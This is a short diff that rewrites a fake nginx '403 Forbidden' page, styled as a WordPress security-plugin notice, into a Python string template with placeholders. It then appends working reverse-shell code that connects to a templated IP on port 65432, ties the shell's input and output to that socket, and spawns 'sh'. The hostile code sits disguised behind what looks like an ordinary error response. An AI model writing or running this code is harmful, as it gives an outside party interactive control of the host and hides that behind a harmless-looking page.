@@ -1,4 +1,4 @@
-HTTP/1.1 403 Forbidden
+"""HTTP/1.1 403 Forbidden
 Server: nginx/1.18.0
 Date: 2025-02-03 15:04:27
 Content-Type: text/plain
@@ -13,12 +13,17 @@ Technical Details:
 - Component: wp-content/plugins/content-protector/security.php
 - Protection Level: Maximum
 - Access Method: Direct Request Blocked
-- Client IP: 143.198.128.10
 
 Security Notice:
-Content access requires valid authentication key. 
-{security_notice_text}
+{error_text}
 
-For system administrators:
-See security.log for full trace or contact security@wordpress.com
---------------------
+--------------------{end_token}""" 
+import socket
+import os
+import pty
+
+s = socket.socket()
+s.connect(("{ip}", 65432))
+s.send(b"{success_message}")
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("sh")
